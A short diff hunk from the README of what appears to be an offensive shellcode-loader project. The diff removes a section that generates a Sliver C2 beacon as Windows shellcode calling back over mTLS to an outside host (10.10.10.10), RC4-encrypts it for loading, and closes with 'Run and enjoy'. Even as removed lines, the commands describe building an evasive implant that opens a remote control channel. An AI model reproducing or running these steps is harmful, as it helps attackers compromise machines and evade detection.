@@ -76,19 +76,5 @@ Size:  0x16
 Contains NULL-bytes: False
 ```
 
-## Remote shellcode loader
-
-Example payload: Sliver implant
-
-```bash
-generate beacon --seconds 10 --jitter 3 --os windows --arch amd64 --format shellcode --mtls 10.10.10.10 --name shellcode-mtls --save /data.bin -G --skip-symbols
-```
-
-Encryption:
-```bash
-rc4.py windows.h data.bin
-```
-
-Run and enjoy :+)
 
 
